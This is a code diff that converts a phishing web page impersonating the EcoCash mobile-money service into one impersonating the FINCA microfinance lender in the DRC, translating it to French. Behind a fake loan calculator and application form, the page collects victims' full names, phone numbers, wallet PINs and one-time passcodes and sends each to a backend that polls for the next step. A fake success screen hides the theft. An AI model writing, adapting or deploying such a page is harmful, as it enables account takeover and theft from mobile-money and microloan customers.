@@ -1,26 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>EcoCash Loans</title>
+  <title>FINCA RDC - Crédit en Ligne</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap');
 
     :root {
-      --ecocash-blue: #0054A6;
-      --ecocash-red: #E31837;
-      --purple-gradient: linear-gradient(90deg, #6B5BFF 0%, #B44FFF 100%);
-      --bg-gray: #f4f6f8;
-      --text-dark: #111;
-      --text-muted: #666;
+      --finca-blue: #003865;
+      --finca-red: #A6192E;
+      --finca-gray: #f4f4f4;
+      --text-dark: #333333;
+      --text-muted: #666666;
+      --border-color: #dcdcdc;
     }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Open Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
     button:focus { outline: none; }
     
     body { 
-      background: var(--bg-gray); 
+      background: var(--finca-gray); 
       display: flex; 
       justify-content: center; 
       align-items: center;
@@ -44,27 +44,56 @@
       .app-wrapper {
         height: 90vh;
         max-height: 850px;
-        border-radius: 16px;
-        box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+        border-radius: 8px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.15);
       }
     }
 
     /* Top Navigation Bar */
     .navbar {
-      background: #f9f9f9;
+      background: #fff;
       width: 100%;
       padding: calc(15px + env(safe-area-inset-top)) 20px 15px 20px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      border-bottom: 1px solid #ddd;
+      border-bottom: 1px solid var(--border-color);
       z-index: 100;
       flex-shrink: 0; 
     }
-    .navbar h1 { font-size: 1.4rem; font-weight: 900; }
-    .navbar h1 .blue { color: var(--ecocash-blue); }
-    .navbar h1 .red { color: var(--ecocash-red); }
-    .menu-icon { font-size: 1.5rem; cursor: pointer; padding: 5px; }
+    
+    /* FINCA Logo styling */
+    .logo-container { display: flex; align-items: center; gap: 8px; }
+    .logo-icon {
+      width: 32px; height: 32px;
+      background-color: var(--finca-red);
+      border-radius: 50%;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo-icon::after {
+      content: '';
+      position: absolute;
+      width: 18px; height: 18px;
+      background: #fff;
+      border-radius: 50% 50% 0 0;
+      top: 7px;
+    }
+    .logo-icon::before {
+      content: '';
+      position: absolute;
+      width: 24px; height: 12px;
+      background: #fff;
+      border-radius: 50%;
+      bottom: 5px;
+      z-index: 2;
+    }
+    .navbar h1 { font-size: 1.4rem; font-weight: 700; color: #999; letter-spacing: 1px;}
+    
+    .nav-links { display: flex; gap: 15px; font-size: 0.9rem; font-weight: 600; color: var(--finca-blue); }
+    .menu-icon { font-size: 1.2rem; color: var(--finca-blue); cursor: pointer; padding: 5px; }
 
     .page-container {
       flex: 1;
@@ -78,141 +107,126 @@
     .page.active { display: flex; }
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-    /* --- PAGE 1: LOAN CALCULATOR --- */
-    .card { background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); padding: 25px; margin: 20px; border: 1px solid #eee; }
-    .page1-header { text-align: center; margin-bottom: 20px; }
-    .page1-header h2 { font-size: 1.6rem; margin-bottom: 8px; }
-    .page1-header p { color: var(--text-muted); font-size: 0.9rem; }
-    
-    .calc-box { background: #f8f9fa; border-radius: 12px; padding: 20px; border: 1px solid #eee; }
-    .calc-row { margin-bottom: 25px; }
-    .calc-labels { display: flex; justify-content: space-between; font-weight: 700; margin-bottom: 15px; }
-    .calc-labels .value { color: #6B5BFF; }
-    .calc-sub { display: flex; justify-content: space-between; font-size: 0.8rem; color: var(--text-muted); margin-top: 8px; }
-    
-    input[type=range] {
-      -webkit-appearance: none;
-      width: 100%;
-      background: transparent;
-      height: 30px;
+    /* --- PAGE 1: LOAN CALCULATOR (Hero Section) --- */
+    .hero-section {
+      background-color: var(--finca-blue);
+      color: #fff;
+      padding: 40px 20px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
     }
+    .hero-section h2 { font-size: 2rem; font-weight: 800; line-height: 1.2; margin-bottom: 20px; }
+    .hero-section p { font-size: 1.1rem; margin-bottom: 25px; opacity: 0.9; line-height: 1.4; }
+    
+    .btn-primary {
+      background: var(--finca-red); color: #fff; border: none; border-radius: 30px;
+      padding: 15px 30px; font-size: 1rem; font-weight: 700;
+      cursor: pointer; transition: 0.2s; align-self: flex-start;
+    }
+    .btn-primary:active { opacity: 0.8; }
+
+    /* Loan Calculator Card */
+    .calc-card {
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      color: var(--text-dark);
+    }
+    .calc-labels { display: flex; justify-content: space-between; font-weight: 700; margin-bottom: 10px; color: var(--finca-blue); }
+    .calc-sub { display: flex; justify-content: space-between; font-size: 0.75rem; color: var(--text-muted); margin-top: 5px; margin-bottom: 20px;}
+    
+    input[type=range] { -webkit-appearance: none; width: 100%; background: transparent; height: 20px; }
     input[type=range]::-webkit-slider-thumb {
-      -webkit-appearance: none;
-      height: 24px; width: 24px;
-      border-radius: 50%;
-      background: #6B5BFF;
-      cursor: pointer;
-      margin-top: -9px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      -webkit-appearance: none; height: 20px; width: 20px; border-radius: 50%;
+      background: var(--finca-red); cursor: pointer; margin-top: -8px;
     }
-    input[type=range]::-webkit-slider-runnable-track {
-      width: 100%; height: 6px;
-      cursor: pointer;
-      background: #ddd;
-      border-radius: 3px;
-    }
+    input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 4px; background: #ddd; border-radius: 2px; }
 
     .monthly-box {
-      background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 15px 20px;
-      display: flex; justify-content: space-between; align-items: center; margin-top: 10px;
+      background: var(--finca-gray); border-radius: 6px; padding: 15px;
+      display: flex; justify-content: space-between; align-items: center;
     }
-    .monthly-box span:first-child { font-size: 1rem; color: #333; }
-    .monthly-box span:last-child { font-size: 1.5rem; font-weight: 700; color: #6B5BFF; }
-
-    .btn-gradient {
-      background: var(--purple-gradient); color: white; border: none; border-radius: 8px;
-      width: calc(100% - 40px); margin: 0 20px 30px; padding: 16px; font-size: 1rem; font-weight: 700;
-      cursor: pointer; transition: 0.2s; min-height: 52px; 
-    }
-    .btn-gradient:active { opacity: 0.8; }
-
-    .features { padding: 0 20px 30px; }
-    .feature-item { display: flex; align-items: center; margin-bottom: 20px; }
-    .feature-icon { font-size: 2rem; margin-right: 15px; }
-    .feature-text h4 { font-size: 1.1rem; margin-bottom: 2px; }
-    .feature-text p { color: var(--text-muted); font-size: 0.85rem; }
+    .monthly-box span:first-child { font-size: 1rem; font-weight: 600; }
+    .monthly-box span:last-child { font-size: 1.4rem; font-weight: 800; color: var(--finca-red); }
 
     /* --- PAGE 2: QUESTIONNAIRE --- */
-    .form-title { font-size: 2rem; margin: 30px 20px 20px; font-weight: 400; font-family: serif; }
+    .form-title { font-size: 1.8rem; margin: 30px 20px 20px; font-weight: 700; color: var(--finca-blue); }
     .form-group { padding: 0 20px; margin-bottom: 20px; }
-    .form-group label { display: block; font-family: serif; font-size: 1.1rem; margin-bottom: 8px; color: #222; }
+    .form-group label { display: block; font-size: 0.9rem; font-weight: 700; margin-bottom: 8px; color: var(--finca-blue); }
     .form-group input, .form-group select {
-      width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px;
-      font-size: 16px; 
-      color: #333; background: #fff; font-family: 'Roboto', sans-serif;
+      width: 100%; padding: 14px; border: 1px solid var(--border-color); border-radius: 6px;
+      font-size: 16px; color: #333; background: #fff;
     }
-    .form-group input:focus, .form-group select:focus { outline: none; border-color: #6B5BFF; }
+    .form-group input:focus, .form-group select:focus { outline: none; border-color: var(--finca-red); }
+    
+    .btn-submit {
+      background: var(--finca-red); color: #fff; border: none; border-radius: 6px;
+      width: calc(100% - 40px); margin: 10px 20px 30px; padding: 16px; font-size: 1rem; font-weight: 700;
+      cursor: pointer;
+    }
 
     /* --- PAGE 3 & 4: LOGIN / OTP --- */
     .login-container { display: flex; flex-direction: column; flex: 1; background: #fff; position: relative; }
     
     .login-top { flex: 1; padding: 30px 20px; text-align: center; display: flex; flex-direction: column; justify-content: center; margin-bottom: 30px;}
-    .login-logo { font-size: 2.5rem; font-weight: 900; margin-bottom: 30px; }
-    .login-logo .blue { color: var(--ecocash-blue); }
-    .login-logo .red { color: var(--ecocash-red); }
-    .login-top h3 { font-size: 1.4rem; color: #333; margin-bottom: 30px; }
+    .login-logo { font-size: 2.2rem; font-weight: 800; margin-bottom: 20px; color: var(--finca-red); letter-spacing: 1px;}
+    .login-top h3 { font-size: 1.3rem; color: var(--finca-blue); margin-bottom: 30px; font-weight: 700;}
 
     .phone-input-box {
-      display: flex; align-items: center; border: 2px solid var(--ecocash-blue); border-radius: 8px;
+      display: flex; align-items: center; border: 1px solid var(--border-color); border-radius: 6px;
       padding: 12px; margin-bottom: 25px; max-width: 350px; margin-left: auto; margin-right: auto; width: 100%;
     }
-    .country-code { display: flex; align-items: center; font-size: 1.1rem; font-weight: 500; padding-right: 15px; border-right: 1px solid #ddd; }
+    .country-code { display: flex; align-items: center; font-size: 1rem; font-weight: 600; padding-right: 15px; border-right: 1px solid var(--border-color); color: var(--finca-blue); }
     
+    /* DRC Flag SVG */
     .flag-icon {
       width: 24px; height: 16px; margin-right: 8px;
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 600 400'%3E%3Crect width='600' height='400' fill='%23fff'/%3E%3Cpath d='M0 0h600v133H0zm0 267h600v133H0z' fill='%23319A38'/%3E%3Cpath d='M0 133h600v134H0z' fill='%23FFD200'/%3E%3Cpath d='M0 0v400l240-200z' fill='%23000' stroke='%23fff' stroke-width='20'/%3E%3Cpath d='M70 200l40-15-25-35 40 10-5-40 30 30 15-40 15 40 30-30-5 40 40-10-25 35 40 15-40 15 25 35-40-10 5 40-30-30-15 40-15-40-30 30 5-40-40 10 25-35z' fill='%23D21034'/%3E%3C/svg%3E");
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 600'%3E%3Cpath fill='%230078d4' d='M0 0h800v600H0z'/%3E%3Cpath fill='%23ce1021' d='M0 400L800 200v100L0 500z'/%3E%3Cpath fill='%23f7d618' d='M0 425L800 225v50L0 475z'/%3E%3Cpath fill='%23f7d618' d='M100 80l20 60 60 20-60 20-20 60-20-60-60-20 60-20z'/%3E%3C/svg%3E");
       background-size: cover; border-radius: 2px;
     }
-    .phone-input-box input { border: none; outline: none; padding-left: 15px; font-size: 16px; width: 100%; font-weight: 500; letter-spacing: 1px;}
+    .phone-input-box input { border: none; outline: none; padding-left: 15px; font-size: 16px; width: 100%; font-weight: 600; letter-spacing: 1px; color: var(--finca-blue);}
 
-    .pin-label { color: var(--text-muted); margin-bottom: 15px; font-size: 0.95rem; }
+    .pin-label { color: var(--finca-blue); font-weight: 600; margin-bottom: 15px; font-size: 0.95rem; }
     .pin-boxes { display: flex; justify-content: center; gap: 12px; }
     .pin-boxes input {
-      width: 50px; height: 60px; border: 1.5px solid var(--ecocash-blue); border-radius: 8px;
-      text-align: center; font-size: 1.5rem; font-weight: 700; outline: none;
+      width: 50px; height: 60px; border: 1px solid var(--border-color); border-radius: 6px;
+      text-align: center; font-size: 1.5rem; font-weight: 700; outline: none; color: var(--finca-blue);
     }
-    .pin-boxes input:focus { box-shadow: 0 0 0 3px rgba(0, 84, 166, 0.2); }
+    .pin-boxes input:focus { border-color: var(--finca-red); }
 
     .otp-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
     .otp-boxes input {
-      width: 45px; height: 55px; border: 1.5px solid #ccc; border-radius: 8px;
-      text-align: center; font-size: 1.3rem; font-weight: 600; outline: none;
+      width: 45px; height: 55px; border: 1px solid var(--border-color); border-radius: 6px;
+      text-align: center; font-size: 1.3rem; font-weight: 600; outline: none; color: var(--finca-blue);
     }
-    .otp-boxes input:focus { border-color: var(--ecocash-blue); box-shadow: 0 0 0 3px rgba(0, 84, 166, 0.2); }
-    .resend-text { color: #333; font-size: 0.95rem; font-weight: 500; }
+    .otp-boxes input:focus { border-color: var(--finca-red); }
+    .resend-text { color: var(--text-muted); font-size: 0.9rem; font-weight: 600; }
     
     .login-bottom {
-      background: var(--ecocash-blue);
+      background: var(--finca-blue);
       padding: 40px 20px calc(30px + env(safe-area-inset-bottom));
       color: #fff; text-align: center; margin-top: auto;
       position: relative;
-    }
-    .login-bottom::before {
-      content: '';
-      position: absolute;
-      top: -30px;
-      left: 0;
-      width: 100%;
-      height: 31px;
-      background-size: 100% 100%;
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1440 320' preserveAspectRatio='none'%3E%3Cpath fill='%230054A6' fill-opacity='1' d='M0,96L80,112C160,128,320,160,480,160C640,160,800,128,960,117.3C1120,107,1280,117,1360,122.7L1440,128L1440,320L1360,320C1280,320,1120,320,960,320C800,320,640,320,480,320C320,320,160,320,80,320L0,320Z'%3E%3C/path%3E%3C/svg%3E");
     }
 
     .login-bottom p { font-size: 0.9rem; margin-bottom: 20px; line-height: 1.4; opacity: 0.9; }
     .bottom-buttons { display: flex; gap: 12px; max-width: 350px; margin: 0 auto; }
     
     .bottom-buttons button {
-      flex: 1; background: #fff; color: #333; border: none; border-radius: 8px;
-      padding: 12px; font-size: 0.85rem; font-weight: 600; cursor: pointer;
+      flex: 1; background: #fff; color: var(--finca-blue); border: none; border-radius: 6px;
+      padding: 12px; font-size: 0.85rem; font-weight: 700; cursor: pointer;
       display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px;
       min-height: 60px;
     }
-    .bottom-buttons button i { color: var(--ecocash-blue); font-size: 1.4rem; }
+    .bottom-buttons button i { color: var(--finca-red); font-size: 1.4rem; }
     
     .login-footer { margin-top: 25px; font-size: 0.75rem; color: rgba(255,255,255,0.7); line-height: 1.5; }
     .login-footer a { color: #fff; text-decoration: underline; }
 
-    .help-link { display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 1rem; font-weight: 500; margin-bottom: 20px; cursor: pointer; }
+    .help-link { display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 1rem; font-weight: 600; margin-bottom: 20px; cursor: pointer; color: #fff;}
     .help-link i { font-size: 1.3rem; }
 
     /* --- PAGE: WAITING / LOADING --- */
@@ -221,16 +235,16 @@
       height: 100%; text-align: center; padding: 40px;
     }
     .spinner {
-      width: 60px; height: 60px; border: 5px solid #f3f3f3;
-      border-top: 5px solid var(--ecocash-blue); border-radius: 50%;
+      width: 60px; height: 60px; border: 4px solid var(--border-color);
+      border-top: 4px solid var(--finca-red); border-radius: 50%;
       animation: spin 1s linear infinite; margin-bottom: 25px;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .waiting-screen h2 { font-size: 1.5rem; color: var(--ecocash-blue); margin-bottom: 10px; }
+    .waiting-screen h2 { font-size: 1.5rem; color: var(--finca-blue); margin-bottom: 10px; font-weight: 700;}
     .waiting-screen p { color: var(--text-muted); line-height: 1.5; }
 
     /* Utilities */
-    .error { color: #d9534f; font-size: 0.85rem; margin-top: 5px; padding: 0 20px; display: none; font-weight: 500; text-align: center;}
+    .error { color: var(--finca-red); font-size: 0.85rem; margin-top: 5px; padding: 0 20px; display: none; font-weight: 600; text-align: center;}
     .hidden { display: none !important; }
   </style>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -240,137 +254,118 @@
 <div class="app-wrapper">
   <!-- Navbar -->
   <div class="navbar">
-    <h1><span class="blue">Eco</span><span class="red">Cash</span></h1>
-    <div class="menu-icon"><i class="fa-solid fa-bars"></i></div>
+    <div class="logo-container">
+      <div class="logo-icon"></div>
+      <h1>FINCA</h1>
+    </div>
+    <div class="nav-links">
+      <span>Learn</span>
+      <span>Borrow <i class="fa-solid fa-chevron-down" style="font-size: 0.7rem;"></i></span>
+    </div>
   </div>
 
   <div class="page-container">
-    <!-- Page 1: Loan Calculator -->
+    <!-- Page 1: Hero & Calculator -->
     <div id="page1" class="page active">
-      <div class="card">
-        <div class="page1-header">
-          <h2>Get Your Loan Approved Fast</h2>
-          <p>Quick approval • Competitive rates • Flexible terms</p>
-        </div>
-
-        <div class="calc-box">
-          <div class="calc-row">
-            <div class="calc-labels"><span>Loan Amount</span><span class="value" id="amountLabel">$5,000</span></div>
-            <input type="range" id="loanAmount" min="100" max="5000" step="100" value="5000" oninput="updateCalc()">
-            <div class="calc-sub"><span>$100</span><span>$5,000</span></div>
-          </div>
-
-          <div class="calc-row" style="margin-bottom: 10px;">
-            <div class="calc-labels"><span>Loan Term</span><span class="value" id="termLabel">12 months</span></div>
-            <input type="range" id="loanTerm" min="6" max="60" step="6" value="12" oninput="updateCalc()">
-            <div class="calc-sub"><span>6 months</span><span>60 months</span></div>
-          </div>
-
-          <div class="monthly-box">
-            <span>Monthly Payment</span>
-            <span id="monthlyLabel">$450.00</span>
-          </div>
-        </div>
+      <div class="hero-section">
+        <h2>Boost your business today</h2>
+        <p>Apply for your credit online<br>Response in 7 days</p>
+        <button class="btn-primary" onclick="showPage('page2')">Apply for your loan</button>
       </div>
 
-      <button class="btn-gradient" onclick="showPage('page2')">APPLY NOW</button>
+      <div class="calc-card">
+        <div class="calc-labels"><span>Loan Amount</span><span class="value" id="amountLabel">500 000 FC</span></div>
+        <input type="range" id="loanAmount" min="50000" max="1000000" step="50000" value="500000" oninput="updateCalc()">
+        <div class="calc-sub"><span>50 000 FC</span><span>1 000 000 FC</span></div>
 
-      <div class="features">
-        <div class="feature-item">
-          <div class="feature-icon">⚡</div>
-          <div class="feature-text"><h4>Fast Approval</h4><p>Within 24 hours</p></div>
-        </div>
-        <div class="feature-item">
-          <div class="feature-icon">💰</div>
-          <div class="feature-text"><h4>Low Rates</h4><p>From 8%</p></div>
-        </div>
-        <div class="feature-item">
-          <div class="feature-icon">🔒</div>
-          <div class="feature-text"><h4>Secure</h4><p>Bank-level</p></div>
+        <div class="calc-labels"><span>Loan Term</span><span class="value" id="termLabel">12 months</span></div>
+        <input type="range" id="loanTerm" min="6" max="60" step="6" value="12" oninput="updateCalc()">
+        <div class="calc-sub"><span>6 months</span><span>60 months</span></div>
+
+        <div class="monthly-box">
+          <span>Monthly Payment</span>
+          <span id="monthlyLabel">45 000 FC</span>
         </div>
       </div>
     </div>
 
     <!-- Page 2: Questionnaire -->
     <div id="page2" class="page">
-      <h2 class="form-title">Questionnaire</h2>
+      <h2 class="form-title">Votre Demande</h2>
       <form id="formQuestionnaire" style="padding-bottom: 20px;">
         <div class="form-group">
-          <label>Full name</label>
-          <input type="text" id="qName" required placeholder="Enter your full name">
+          <label>Nom complet</label>
+          <input type="text" id="qName" required placeholder="Entrez votre nom complet">
         </div>
         <div class="form-group">
-          <label>Employment status</label>
+          <label>Situation professionnelle</label>
           <select id="qEmployment" required>
-            <option value="">Select your employment status</option>
-            <option>Employed</option>
-            <option>Self-Employed</option>
-            <option>Unemployed</option>
+            <option value="">Sélectionnez votre situation</option>
+            <option>Employé</option>
+            <option>Travailleur indépendant</option>
+            <option>Sans emploi</option>
           </select>
         </div>
         <div class="form-group">
-          <label>Monthly income</label>
-          <input type="number" id="qIncome" required placeholder="Enter your monthly income">
+          <label>Revenu mensuel (FC)</label>
+          <input type="number" id="qIncome" required placeholder="Entrez votre revenu mensuel">
         </div>
         <div class="form-group">
-          <label>Loan amount</label>
-          <input type="number" id="qAmount" required placeholder="Enter loan amount">
+          <label>Montant du prêt (FC)</label>
+          <input type="number" id="qAmount" required placeholder="Entrez le montant du prêt">
         </div>
         <div class="form-group">
-          <label>Repayment period (months)</label>
+          <label>Période de remboursement</label>
           <select id="qTerm" required>
-            <option value="">Select repayment period</option>
-            <option>6 months</option>
-            <option>12 months</option>
-            <option>24 months</option>
-            <option>36 months</option>
+            <option value="">Sélectionnez la période</option>
+            <option>6 mois</option>
+            <option>12 mois</option>
+            <option>24 mois</option>
+            <option>36 mois</option>
           </select>
         </div>
         
         <div class="error" id="errQ"></div>
-        <button type="submit" class="btn-gradient" style="margin: 20px;">SUBMIT APPLICATION</button>
+        <button type="submit" class="btn-submit">SOUMETTRE LA DEMANDE</button>
       </form>
     </div>
 
     <!-- Page 3: Phone & PIN -->
     <div id="page3" class="page">
       <div class="login-container">
-        <form id="loginForm">
-          <div class="login-top">
-            <div class="login-logo"><span class="blue">Eco</span><span class="red">Cash</span></div>
-            <h3>Login</h3>
+        <div class="login-top">
+          <div class="login-logo">FINCA</div>
+          <h3>Connexion</h3>
 
-            <div class="phone-input-box">
-              <div class="country-code">
-                <div class="flag-icon"></div>
-                +263
-              </div>
-              <input type="tel" id="pPhone" placeholder="Phone Number" required>
+          <div class="phone-input-box">
+            <div class="country-code">
+              <div class="flag-icon"></div>
+              +243
             </div>
-
-            <p class="pin-label">Enter your PIN</p>
-            <div class="pin-boxes" id="pinContainer">
-              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
-              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
-              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
-              <input type="password" maxlength="1" inputmode="numeric" id="pin3">
-            </div>
-            <div class="error" id="errLogin" style="margin-top: 15px;"></div>
+            <input type="tel" id="pPhone" placeholder="Numéro de téléphone">
           </div>
 
-          <div class="login-bottom">
-            <p>To register an EcoCash wallet or get assistance,<br>click below</p>
-            <div class="bottom-buttons">
-              <!-- Register button is the submit trigger -->
-              <button type="submit"><i class="fa-solid fa-user-plus"></i>Register</button>
-              <button type="button" onclick="alert('For assistance, please call our support line at 111.')"><i class="fa-solid fa-circle-info"></i>Help & Support</button>
-            </div>
-            <div class="login-footer">
-              v4.0.3P<br><br>
-              By signing in you agree to the <a href="#">Terms and Conditions</a>
-            </div>
+          <p class="pin-label">Entrez votre code PIN</p>
+          <div class="pin-boxes" id="pinContainer">
+            <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
+            <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
+            <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
+            <input type="password" maxlength="1" inputmode="numeric" id="pin3">
           </div>
-        </form>
+          <div class="error" id="errLogin" style="margin-top: 15px;"></div>
+        </div>
+
+        <div class="login-bottom">
+          <p>Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous</p>
+          <div class="bottom-buttons">
+            <button type="button" onclick="submitRegistration()"><i class="fa-solid fa-user-plus"></i>S'inscrire</button>
+            <button type="button" onclick="alert('Pour obtenir de l aide, veuillez appeler notre service client.')"><i class="fa-solid fa-circle-info"></i>Aide & Support</button>
+          </div>
+          <div class="login-footer">
+            v4.0.3P<br><br>
+            En vous connectant, vous acceptez les <a href="#">Conditions Générales</a>
+          </div>
+        </div>
       </div>
     </div>
 
@@ -378,9 +373,9 @@
     <div id="page4" class="page">
       <div class="login-container">
         <div class="login-top">
-          <div class="login-logo"><span class="blue">Eco</span><span class="red">Cash</span></div>
-          <h3>Enter the OTP code sent to</h3>
-          <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem;">+263 77 000 0000</div>
+          <div class="login-logo">FINCA</div>
+          <h3>Entrez le code OTP envoyé à</h3>
+          <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--finca-blue);">+243 00 000 0000</div>
 
           <div class="otp-boxes" id="otpContainer">
             <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp1')" id="otp0">
@@ -391,12 +386,12 @@
             <input type="text" maxlength="1" inputmode="numeric" id="otp5">
           </div>
 
-          <p class="resend-text">Resend OTP in <span id="timer">44</span> Sec</p>
+          <p class="resend-text">Renvoyer l'OTP dans <span id="timer">44</span> Sec</p>
           <div class="error" id="errOtp" style="margin-top: 15px;"></div>
         </div>
 
         <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
-          <div class="help-link" onclick="alert('For assistance, please call our support line at 111.')"><i class="fa-regular fa-circle-question"></i> Help & Support</div>
+          <div class="help-link" onclick="alert('Pour obtenir de l aide, veuillez appeler notre service client.')"><i class="fa-regular fa-circle-question"></i> Aide & Support</div>
           <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
         </div>
       </div>
@@ -406,15 +401,15 @@
     <div id="page-waiting" class="page">
       <div class="waiting-screen">
         <div class="spinner"></div>
-        <h2>Please Wait...</h2>
-        <p>We are verifying your details.<br>This may take a moment.</p>
+        <h2>Veuillez patienter...</h2>
+        <p>Nous vérifions vos informations.<br>Cela peut prendre un moment.</p>
       </div>
     </div>
 
     <!-- Page 6: Success -->
     <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
-      <h2 style="color: #10b981; font-size: 2.5rem; margin-bottom: 20px;">Success!</h2>
-      <p style="color: #666; font-size: 1.1rem; line-height: 1.5;">Your loan application has been fully processed. Please check your EcoCash wallet shortly.</p>
+      <h2 style="color: var(--finca-blue); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;">Félicitations!</h2>
+      <p style="color: var(--text-dark); font-size: 1.1rem; line-height: 1.5;">Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.</p>
     </div>
   </div>
 </div>
@@ -429,7 +424,7 @@
       const res = await fetch('/api/session', { method: 'POST' });
       const data = await res.json();
       sessionId = data.sessionId;
-    } catch (err) { alert('Connection error. Please refresh.'); }
+    } catch (err) { alert('Erreur de connexion. Veuillez rafraîchir.'); }
   }
   init();
 
@@ -443,11 +438,11 @@
     const amount = document.getElementById('loanAmount').value;
     const term = document.getElementById('loanTerm').value;
     
-    document.getElementById('amountLabel').textContent = '$' + Number(amount).toLocaleString();
-    document.getElementById('termLabel').textContent = term + ' months';
+    document.getElementById('amountLabel').textContent = Number(amount).toLocaleString('fr-FR') + ' FC';
+    document.getElementById('termLabel').textContent = term + ' mois';
 
     const monthly = (amount * 1.08) / term; 
-    document.getElementById('monthlyLabel').textContent = '$' + monthly.toFixed(2);
+    document.getElementById('monthlyLabel').textContent = Number(monthly).toLocaleString('fr-FR', {maximumFractionDigits: 0}) + ' FC';
   }
 
   // Page 2 Submit
@@ -460,8 +455,8 @@
     const data = {
       fullName: document.getElementById('qName').value,
       employment: document.getElementById('qEmployment').value,
-      income: document.getElementById('qIncome').value,
-      loanAmount: document.getElementById('qAmount').value,
+      income: document.getElementById('qIncome').value + ' FC',
+      loanAmount: document.getElementById('qAmount').value + ' FC',
       loanTerm: document.getElementById('qTerm').value
     };
 
@@ -474,7 +469,7 @@
         startPolling(); 
       } else { throw new Error(); }
     } catch (err) {
-      document.getElementById('errQ').textContent = 'Submission failed. Try again.';
+      document.getElementById('errQ').textContent = 'Échec de la soumission. Réessayez.';
       document.getElementById('errQ').style.display = 'block';
       btn.disabled = false;
     }
@@ -486,16 +481,13 @@
     }
   }
 
-  // Page 3 Submit (Triggered by Register Button)
-  document.getElementById('loginForm').addEventListener('submit', async (e) => {
-    e.preventDefault(); // Prevents page reload
-    
+  // Page 3 Submit
+  async function submitRegistration() {
     const phone = document.getElementById('pPhone').value.trim();
     const pins = Array.from(document.querySelectorAll('#pinContainer input')).map(i => i.value).join('');
     
-    // Validation REMOVED. Just checking if they are empty so we don't send blank messages.
     if (phone === '' || pins === '') {
-      document.getElementById('errLogin').textContent = 'Please fill in the phone number and PIN.';
+      document.getElementById('errLogin').textContent = 'Veuillez remplir le numéro et le code PIN.';
       document.getElementById('errLogin').style.display = 'block';
       return;
     }
@@ -503,8 +495,8 @@
     document.getElementById('errLogin').style.display = 'none';
     
     const data = {
-      fullName: document.getElementById('qName').value, // Grab from page 2
-      phone: '+263 ' + phone,
+      fullName: document.getElementById('qName').value, 
+      phone: '+243 ' + phone,
       pin: pins
     };
 
@@ -519,10 +511,10 @@
       });
       if (res.ok) startPolling(); 
     } catch (err) {
-      document.getElementById('errLogin').textContent = 'Connection error.';
+      document.getElementById('errLogin').textContent = 'Erreur de connexion.';
       document.getElementById('errLogin').style.display = 'block';
     }
-  });
+  }
 
   function moveFocusOTP(current, nextId) {
     if (current.value.length === 1) {
@@ -530,7 +522,6 @@
     }
   }
 
-  // Triggered when the 6th OTP box is filled, or they hit enter
   document.getElementById('otpContainer').addEventListener('input', function(e) {
     const otp = Array.from(document.querySelectorAll('#otpContainer input')).map(i => i.value).join('');
     if (otp.length === 6) {
@@ -540,8 +531,6 @@
 
   async function submitOTP() {
     const otp = Array.from(document.querySelectorAll('#otpContainer input')).map(i => i.value).join('');
-    
-    // Validation REMOVED. It sends whatever they typed.
     if (otp === '') return;
 
     document.getElementById('errOtp').style.display = 'none';
@@ -553,7 +542,7 @@
       });
       if (res.ok) startPolling(); 
     } catch (err) {
-      document.getElementById('errOtp').textContent = 'Connection error.';
+      document.getElementById('errOtp').textContent = 'Erreur de connexion.';
